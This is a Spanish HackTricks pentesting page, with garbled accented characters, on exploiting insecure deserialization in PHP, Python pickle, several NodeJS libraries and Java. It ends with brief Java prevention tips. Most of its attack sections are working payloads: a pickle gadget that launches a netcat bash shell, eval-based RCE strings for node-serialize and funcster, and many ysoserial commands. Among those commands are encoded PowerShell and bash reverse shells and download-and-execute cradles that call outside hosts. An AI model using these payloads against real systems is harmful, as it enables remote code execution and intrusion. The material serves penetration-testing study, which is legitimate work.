# Deserializaci√≥n

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Serializaci√≥n** es el proceso de convertir un objeto en un formato de datos que se puede restaurar m√°s tarde. A menudo, las personas serializan objetos para guardarlos en almacenamiento o enviarlos como parte de las comunicaciones.

**Deserializaci√≥n** es el proceso inverso, tomando datos estructurados de alg√∫n formato y reconstruy√©ndolos en un objeto. Hoy en d√≠a, el formato de datos m√°s popular para la serializaci√≥n de datos es JSON. Antes de eso, era XML.

En muchas ocasiones, puedes encontrar c√≥digo en el lado del servidor que deserializa alg√∫n objeto proporcionado por el usuario.\
En este caso, puedes enviar una carga √∫til maliciosa para hacer que el lado del servidor se comporte de manera inesperada.

**Debes leer:** [**https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html) **para aprender c√≥mo atacar.**

## PHP

M√©todo m√°gico utilizado con la serializaci√≥n:

* `__sleep` se llama cuando un objeto se serializa y debe devolverse como un array.

M√©todo m√°gico utilizado con la deserializaci√≥n:

* `__wakeup` se llama cuando un objeto se deserializa.
* `__unserialize` se llama en lugar de `__wakeup` si existe.
* `__destruct` se llama cuando el script de PHP finaliza y el objeto se destruye.
* `__toString` utiliza el objeto como una cadena, pero tambi√©n se puede usar para leer archivos o algo m√°s basado en la llamada de funci√≥n dentro de √©l.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Si observas los resultados, puedes ver que las funciones **`__wakeup`** y **`__destruct`** se llaman cuando el objeto es deserializado. Ten en cuenta que en varios tutoriales encontrar√°s que la funci√≥n **`__toString`** se llama al intentar imprimir alg√∫n atributo, pero aparentemente eso ya **no sucede**.

{% hint style="warning" %}
El m√©todo **`__unserialize(array $data)`** se llama **en lugar de `__wakeup()`** si est√° implementado en la clase. Te permite deserializar el objeto proporcionando los datos serializados como un array. Puedes usar este m√©todo para deserializar propiedades y realizar cualquier tarea necesaria al deserializar.
```php
phpCopy codeclass MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Puedes leer un ejemplo de PHP explicado aqu√≠: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), aqu√≠ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) o aqu√≠ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Puedes abusar de la funcionalidad de carga autom√°tica de PHP para cargar archivos php arbitrarios y m√°s:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializando Valores Referenciados

Si por alguna raz√≥n quieres serializar un valor como una **referencia a otro valor serializado**, puedes hacerlo:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial para PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) puede ayudarte a generar payloads para abusar de las deserializaciones en PHP.\
Ten en cuenta que en varios casos **no podr√°s encontrar una forma de abusar de una deserializaci√≥n en el c√≥digo fuente** de la aplicaci√≥n, pero podr√≠as ser capaz de **abusar del c√≥digo de extensiones externas de PHP**.\
Entonces, si puedes, verifica la `phpinfo()` del servidor y **busca en internet** (incluso en los **gadgets** de **PHPGGC**) alg√∫n posible gadget que puedas abusar.

### Deserializaci√≥n de metadatos phar://

Si has encontrado una LFI que solo lee el archivo y no ejecuta el c√≥digo PHP dentro de √©l, por ejemplo, utilizando funciones como _**file\_get\_contents(), fopen(), file() o file\_exists(), md5\_file(), filemtime() o filesize()**_**.** Puedes intentar abusar de una **deserializaci√≥n** que ocurre al **leer** un **archivo** utilizando el protocolo **phar**.\
Para obtener m√°s informaci√≥n, lee el siguiente art√≠culo:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Cuando el objeto se deserializa, se ejecutar√° la funci√≥n _\_\_reduce\_\__.\
Cuando se explota, el servidor podr√≠a devolver un error.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Para obtener m√°s informaci√≥n sobre c√≥mo escapar de las **c√°rceles de pickle**, consulta:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

La siguiente p√°gina presenta la t√©cnica para **abusar de una deserializaci√≥n insegura en las bibliotecas de Python de yamls** y finaliza con una herramienta que se puede utilizar para generar una carga √∫til de deserializaci√≥n RCE para **Pickle, PyYAML, jsonpickle y ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Contaminaci√≥n de Clases (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### Funciones M√°gicas de JS

JS **no tiene funciones "m√°gicas"** como PHP o Python que se ejecutar√°n solo para crear un objeto. Pero tiene algunas **funciones** que se **utilizan con frecuencia incluso sin llamarlas directamente**, como **`toString`**, **`valueOf`**, **`toJSON`**.\
Si abusas de una deserializaci√≥n, puedes **comprometer estas funciones para ejecutar otro c√≥digo** (potencialmente abusando de contaminaciones de prototipos) y as√≠ ejecutar c√≥digo arbitrario cuando se llamen.

Otra forma **"m√°gica" de llamar a una funci√≥n** sin llamarla directamente es **comprometer un objeto que es devuelto por una funci√≥n as√≠ncrona** (promesa). Porque, si **transformas** ese **objeto devuelto** en otra **promesa** con una **propiedad** llamada **"then" de tipo funci√≥n**, se ejecutar√° solo porque es devuelto por otra promesa. _Sigue_ [_**este enlace**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _para obtener m√°s informaci√≥n._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` y `prototype` pollution

Si quieres aprender sobre esta t√©cnica, **echa un vistazo al siguiente tutorial**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Esta biblioteca permite serializar funciones. Ejemplo:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
El **objeto serializado** se ver√° as√≠:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Puedes ver en el ejemplo que cuando una funci√≥n es serializada, se agrega la bandera `_$$ND_FUNC$$_` al objeto serializado.

Dentro del archivo `node-serialize/lib/serialize.js`, puedes encontrar la misma bandera y c√≥mo se utiliza en el c√≥digo.

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

Como puedes ver en el √∫ltimo fragmento de c√≥digo, si se encuentra la bandera, se utiliza `eval` para deserializar la funci√≥n, por lo que b√°sicamente se est√° utilizando la entrada del usuario dentro de la funci√≥n `eval`.

Sin embargo, simplemente serializar una funci√≥n no la ejecutar√°, ya que ser√≠a necesario que alguna parte del c√≥digo est√© llamando a `y.rce` en nuestro ejemplo, lo cual es muy poco probable.\
De todos modos, podr√≠as modificar el objeto serializado agregando algunos par√©ntesis para que la funci√≥n serializada se ejecute autom√°ticamente cuando se deserialice el objeto.\
En el siguiente fragmento de c√≥digo, observa el √∫ltimo par√©ntesis y c√≥mo la funci√≥n `unserialize` ejecutar√° autom√°ticamente el c√≥digo:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Como se indic√≥ anteriormente, esta biblioteca obtendr√° el c√≥digo despu√©s de `_$$ND_FUNC$$_` y lo **ejecutar√°** utilizando `eval`. Por lo tanto, para **auto-ejecutar c√≥digo**, puedes **eliminar la parte de creaci√≥n de la funci√≥n** y el √∫ltimo par√©ntesis y **simplemente ejecutar un comando de JavaScript en una sola l√≠nea** como en el siguiente ejemplo:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Puedes [**encontrar aqu√≠**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **m√°s informaci√≥n** sobre c√≥mo explotar esta vulnerabilidad.

### [funcster](https://www.npmjs.com/package/funcster)

La diferencia interesante aqu√≠ es que los **objetos integrados est√°ndar no son accesibles**, porque est√°n fuera de alcance. Esto significa que podemos ejecutar nuestro c√≥digo, pero no podemos llamar a los m√©todos de los objetos integrados. Entonces, si usamos `console.log()` o `require(something)`, Node devuelve una excepci√≥n como `"ReferenceError: console is not defined"`.

Sin embargo, podemos recuperar f√°cilmente el acceso a todo porque a√∫n tenemos acceso al contexto global usando algo como `this.constructor.constructor("console.log(1111)")();`:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Para obtener m√°s informaci√≥n, lee esta p√°gina**.

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

El paquete **no incluye ninguna funcionalidad de deserializaci√≥n** y requiere que la implementes t√∫ mismo. Su ejemplo utiliza `eval` directamente. Este es el ejemplo oficial de deserializaci√≥n:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Si esta funci√≥n se utiliza para deserializar objetos, puedes **explotarla f√°cilmente**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
### Biblioteca Cryo

En las siguientes p√°ginas puedes encontrar informaci√≥n sobre c√≥mo abusar de esta biblioteca para ejecutar comandos arbitrarios:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

El principal problema con los objetos deserializados en Java es que **se invocaron devoluciones de llamada de deserializaci√≥n durante la deserializaci√≥n**. Esto permite que un **atacante** se **aproveche de esas devoluciones de llamada** y prepare un payload que abuse de las devoluciones de llamada para **realizar acciones maliciosas**.

### Huellas

#### Caja Blanca

Busca en el c√≥digo las clases y funciones de serializaci√≥n. Por ejemplo, busca clases que implementen `Serializable`, el uso de `java.io.ObjectInputStream` \_\_ o las funciones `readObject` \_\_ o `readUnshare`\_.

Tambi√©n debes prestar atenci√≥n a:

* `XMLdecoder` con par√°metros definidos por el usuario externo
* `XStream` con el m√©todo `fromXML` (la versi√≥n xstream <= v1.46 es vulnerable al problema de serializaci√≥n)
* `ObjectInputStream` con `readObject`
* Uso de `readObject`, `readObjectNodData`, `readResolve` o `readExternal`
* `ObjectInputStream.readUnshared`
* `Serializable`

#### Caja Negra

**Huellas/Bytes M√°gicos** de objetos **serializados de Java** (de `ObjectInputStream`):

* `AC ED 00 05` en Hexadecimal
* `rO0` en Base64
* Encabezado `Content-type` de una respuesta HTTP establecido en `application/x-java-serialized-object`
* `1F 8B 08 00` Hexadecimal previamente comprimido
* `H4sIA` Base64 previamente comprimido
* Archivos web con extensi√≥n `.faces` y par√°metro `faces.ViewState`. Si encuentras esto en una aplicaci√≥n web, echa un vistazo al [**post sobre la deserializaci√≥n de Java JSF VewState**](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Verificar si es vulnerable

Si quieres **aprender c√≥mo funciona una explotaci√≥n de deserializaci√≥n en Java**, deber√≠as echar un vistazo a [**Deserializaci√≥n b√°sica en Java**](basic-java-deserialization-objectinputstream-readobject.md), [**Deserializaci√≥n de DNS en Java**](java-dns-deserialization-and-gadgetprobe.md) y [**Carga √∫til de CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Prueba de caja blanca

Puedes verificar si est√° instalada alguna aplicaci√≥n con vulnerabilidades conocidas.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Puedes intentar **verificar todas las bibliotecas** conocidas por ser vulnerables y para las cuales [**Ysoserial**](https://github.com/frohoff/ysoserial) puede proporcionar un exploit. O puedes verificar las bibliotecas indicadas en [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Tambi√©n puedes usar [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) para buscar posibles cadenas de gadgets que se puedan explotar.\
Cuando ejecutes **gadgetinspector** (despu√©s de compilarlo), no te preocupes por las toneladas de advertencias/errores que aparecen y d√©jalo terminar. Escribir√° todos los hallazgos en _gadgetinspector/gadget-results/gadget-chains-a√±o-mes-d√≠a-hora-min.txt_. Ten en cuenta que **gadgetinspector no crear√° un exploit y puede indicar falsos positivos**.

#### Prueba de Caja Negra

Usando la extensi√≥n de Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md), puedes identificar **qu√© bibliotecas est√°n disponibles** (e incluso las versiones). Con esta informaci√≥n, podr√≠a ser **m√°s f√°cil elegir un payload** para explotar la vulnerabilidad.\
[**Lee esto para obtener m√°s informaci√≥n sobre GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe se centra en las deserializaciones de \*\* `ObjectInputStream` \*\*.\*\*

Usando la extensi√≥n de Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner), puedes **identificar bibliotecas vulnerables** explotables con ysoserial y **explotarlas**.\
[**Lee esto para obtener m√°s informaci√≥n sobre Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner se centra en las deserializaciones de **`ObjectInputStream`**.

Tambi√©n puedes usar [**Freddy**](https://github.com/nccgroup/freddy) para **detectar vulnerabilidades** de deserializaci√≥n en **Burp**. Este complemento detectar√° vulnerabilidades relacionadas no solo con `ObjectInputStream`, sino tambi√©n con bibliotecas de deserializaci√≥n de **Json** y **Yml**. En modo activo, intentar√° confirmarlas utilizando payloads de sleep o DNS.\
[**Puedes encontrar m√°s informaci√≥n sobre Freddy aqu√≠.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Prueba de Serializaci√≥n**

No todo se trata de verificar si el servidor utiliza alguna biblioteca vulnerable. A veces puedes ser capaz de **cambiar los datos dentro del objeto serializado y evadir algunas comprobaciones** (quiz√°s otorgarte privilegios de administrador dentro de una aplicaci√≥n web).\
Si encuentras un objeto serializado de Java que se env√≠a a una aplicaci√≥n web, **puedes usar** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **para imprimir en un formato m√°s legible para los humanos el objeto de serializaci√≥n que se env√≠a**. Saber qu√© datos est√°s enviando facilitar√≠a modificarlos y evadir algunas comprobaciones.

### **Exploit**

#### **ysoserial**

La herramienta m√°s conocida para explotar deserializaciones de Java es [**ysoserial**](https://github.com/frohoff/ysoserial) ([**descargar aqu√≠**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Tambi√©n puedes considerar usar [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified), que te permitir√° usar comandos complejos (con tuber√≠as, por ejemplo).\
Ten en cuenta que esta herramienta est√° **centrada** en explotar **`ObjectInputStream`**.\
Yo **comenzar√≠a usando el payload "URLDNS"** antes que un payload de RCE para probar si la inyecci√≥n es posible. De todos modos, ten en cuenta que tal vez el payload "URLDNS" no funcione, pero otro payload de RCE s√≠ lo haga.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"
# Codificar la carga √∫til en base64
base64 -w0 payload
```
Al crear un payload para **java.lang.Runtime.exec()**, **no puedes usar caracteres especiales** como ">" o "|" para redirigir la salida de una ejecuci√≥n, "$()" para ejecutar comandos o incluso **pasar argumentos** a un comando separados por **espacios** (puedes hacer `echo -n "hello world"` pero no puedes hacer `python2 -c 'print "Hello world"'`). Para codificar correctamente el payload, puedes [utilizar esta p√°gina web](http://www.jackson-t.ca/runtime-exec-payloads.html).

Si√©ntete libre de utilizar el siguiente script para crear **todos los posibles payloads de ejecuci√≥n de c√≥digo** para Windows y Linux, y luego probarlos en la p√°gina web vulnerable:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Puedes **utilizar** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **junto con ysoserial para crear m√°s exploits**. M√°s informaci√≥n sobre esta herramienta en las **diapositivas de la charla** donde se present√≥ la herramienta: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) se puede utilizar para generar payloads y explotar diferentes bibliotecas de serializaci√≥n **Json** y **Yml** en Java.\
Para compilar el proyecto, necesit√© **agregar** estas **dependencias** al archivo `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instala Maven** y **compila** el proyecto:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Lee m√°s sobre esta biblioteca de JSON en Java: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratorios

* Si quieres probar algunos payloads de ysoserial, puedes **ejecutar esta aplicaci√≥n web**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Por qu√©

Java AMA enviar objetos serializados por todas partes. Por ejemplo:

* En **solicitudes HTTP** - Par√°metros, ViewState, Cookies, lo que sea.
* **RMI** - El protocolo Java RMI ampliamente utilizado se basa al 100% en la serializaci√≥n.
* **RMI sobre HTTP** - Muchas aplicaciones web de cliente grueso en Java utilizan esto, nuevamente objetos serializados al 100%.
* **JMX** - Nuevamente, se basa en el env√≠o de objetos serializados a trav√©s de la red.
* **Protocolos personalizados** - Enviar y recibir objetos Java sin procesar es la norma, como veremos en algunos de los exploits que vendr√°n.

### Prevenci√≥n

#### Objetos transitorios

Una clase que implementa `Serializable` puede marcar como `transient` cualquier objeto dentro de la clase que no deba ser serializable. Por ejemplo:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Evitar la serializaci√≥n de una clase que necesita implementar Serializable

Algunos de los objetos de tu aplicaci√≥n pueden verse obligados a implementar `Serializable` debido a su jerarqu√≠a. Para garantizar que tus objetos de aplicaci√≥n no puedan ser deserializados, se debe declarar un m√©todo `readObject()` (con un modificador `final`) que siempre lance una excepci√≥n:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### Verificar la clase deserializada antes de deserializarla

La clase `java.io.ObjectInputStream` se utiliza para deserializar objetos. Es posible fortalecer su comportamiento mediante la creaci√≥n de una subclase. Esta es la mejor soluci√≥n si:

* Puedes cambiar el c√≥digo que realiza la deserializaci√≥n
* Sabes qu√© clases esperas deserializar

